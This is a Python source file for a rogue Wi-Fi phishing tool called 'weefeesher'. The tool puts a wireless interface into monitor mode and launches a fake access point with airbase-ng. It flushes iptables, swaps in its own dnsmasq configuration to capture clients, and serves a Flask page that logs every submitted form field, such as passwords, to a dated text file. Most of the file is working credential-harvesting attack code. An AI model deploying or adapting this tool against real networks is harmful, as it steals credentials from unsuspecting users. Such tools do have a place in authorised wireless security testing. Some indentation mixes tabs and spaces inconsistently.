#!/usr/bin/env python

import subprocess
import datetime
import argparse
import signal
import time
import sys
import os

from weefeesher.utils.output import Logger
from flask import Flask,flash,render_template,request

import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

here = os.path.dirname(os.path.abspath(__file__))

def save_iptables():
    subprocess.call('iptables-save > /tmp/weefeesher.iptables.state', shell=True)

def flush_iptables():
    subprocess.call('iptables -F', shell=True)
    subprocess.call('iptables -X', shell=True)

def restore_iptables():
    subprocess.call('iptables-restore < /tmp/weefeesher.iptables.state', shell=True, executable="/bin/bash")
    subprocess.call('rm -f /tmp/weefeesher.iptables.state', shell=True, executable="/bin/bash")

class Web():

    def __init__(self):
        self.app =  Flask(__name__)

    def run(self):
        @self.app.route('/', methods = ['GET', 'POST'])
        def index():
            if request.method == 'POST':
                data = request.form
                for key in data.keys():
                    for value in data.getlist(key):
                        Logger.userinfo("%s : %s" % (key, value))
                        with open('weefeesher.%s.txt' % str(datetime.date.today()), 'a+') as fd:
                            fd.write('[%s] %s\n' % (key, value))
                with open('weefeesher.%s.txt' % str(datetime.date.today()), 'a+') as fd:
                    fd.write('\n')

            return render_template('index.html')

        self.app.run('192.168.10.1',80)

class Dnsmasq():

    def __init__(self):
        pass

    def backup(self):
        subprocess.call('[[ -f /etc/dnsmasq.conf ]] && mv /etc/dnsmasq.conf /tmp/weefeesher.dnsmasq.conf', shell=True, executable="/bin/bash")

    def deploy(self):
        subprocess.call('cp %s/conf/dnsmasq.conf /etc/dnsmasq.conf' % here, shell=True, executable="/bin/bash")
        subprocess.call('killall -9 dnsmasq &> /dev/null; dnsmasq', shell=True, executable="/bin/bash")

    def restore(self):
    	Logger.info('Restoring dnsmasq base config file')
        subprocess.call('[[ -f /tmp/weefeesher.dnsmasq.conf ]] && mv /tmp/weefeesher.dnsmasq.conf /etc/dnsmasq.conf', shell=True, executable="/bin/bash")

    def kill(self):
    	Logger.info('Killing dnsmasq instance')
        subprocess.call('killall -9 dnsmasq &> /dev/null', shell=True, executable="/bin/bash")

def check_requirements():

    user = subprocess.check_output('whoami', shell=True, executable="/bin/bash")[:-1]
    if user != 'root':
        Logger.error("Please launch this program as root")
        sys.exit(0)
    dnsmasq = subprocess.call('which dnsmasq &> /dev/null', shell=True, executable="/bin/bash")
    if dnsmasq:
        Logger.error("Please install dnsmasq")
        sys.exit(0)
    airbase = subprocess.call('which airbase-ng &> /dev/null', shell=True, executable="/bin/bash")
    if airbase:
        Logger.error("Please install aircrack suite, especially airbase-ng")
        sys.exit(0)

def signal_handler(signal, frame):
    global phishing_iface
    global dns
    Logger.info('Shutting down rogue AP')
    subprocess.call('pkill -9 airbase-ng', shell=True)
    Logger.info('Up wireless interface')
    subprocess.call('ip link set %s up' % phishing_iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s up' % phishing_iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s up' % phishing_iface, shell=True, executable="/bin/bash")
    Logger.info('Restoring iptables rules')
    restore_iptables()
    dns.kill()
    dns.restore()
    Logger.info('Bye !')
    sys.exit(0)

def launch_ap(iface, essid):
    Logger.info('Shutting down phishing interface %s' % iface)
    subprocess.call('ip link set %s down' % iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s down' % iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s down' % iface, shell=True, executable="/bin/bash")
    subprocess.call('iw %s set type monitor' % iface, shell=True, executable="/bin/bash")
    subprocess.call('iw %s set type monitor' % iface, shell=True, executable="/bin/bash")
    subprocess.call('iw %s set type monitor' % iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s up' % iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s up' % iface, shell=True, executable="/bin/bash")
    subprocess.call('ip link set %s up' % iface, shell=True, executable="/bin/bash")
    Logger.info('Launching rogue access point...')
    subprocess.Popen('airbase-ng --essid %s -I 60 %s &> /dev/null' % (essid, iface), shell=True, executable="/bin/bash")
    time.sleep(2)
    subprocess.call('ip addr add 192.168.10.1/24 dev at0', shell=True, executable="/bin/bash")


def main():
    parser = argparse.ArgumentParser(description="Tassin : Sysdream reporting tool")
    parser.add_argument(
        "-e", "--essid",
        help="The hotspot ESSID",
        default='Hotspot'
    )
    parser.add_argument(
        "-i", "--interface",
        help="The wireless interface to use",
        metavar='INTERFACE'
    )

    args = parser.parse_args()

    check_requirements()
    global phishing_iface
    phishing_iface = args.interface
    global essid
    essid = args.essid
    signal.signal(signal.SIGINT, signal_handler)
    save_iptables()
    flush_iptables()
    global dns
    dns = Dnsmasq()
    dns.backup()
    launch_ap(phishing_iface, essid)
    dns.deploy()
    web = Web()
    web.run()
    while True:
        pass
